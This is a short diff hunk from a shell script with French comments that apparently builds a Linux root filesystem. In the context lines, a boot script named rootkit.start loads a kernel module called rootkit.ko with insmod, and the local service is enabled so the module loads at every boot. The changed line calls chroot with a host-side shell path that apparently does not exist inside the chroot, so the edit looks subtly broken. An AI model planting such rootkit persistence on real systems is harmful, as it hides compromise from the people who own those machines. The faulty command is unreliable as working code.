@@ -138,8 +138,9 @@ insmod /home/user/rootkit.ko
 EOF
 chmod +x "$ROOTFS_DIR/etc/local.d/rootkit.start"
 
-chroot "$ROOTFS_DIR" rc-update add local default
-
+sudo chroot "$ROOTFS_DIR" "$ROOTFS_DIR/bin/sh" -c "
+    rc-update add local default
+"
 ########################################
 #          Nettoyage                   #
 ########################################
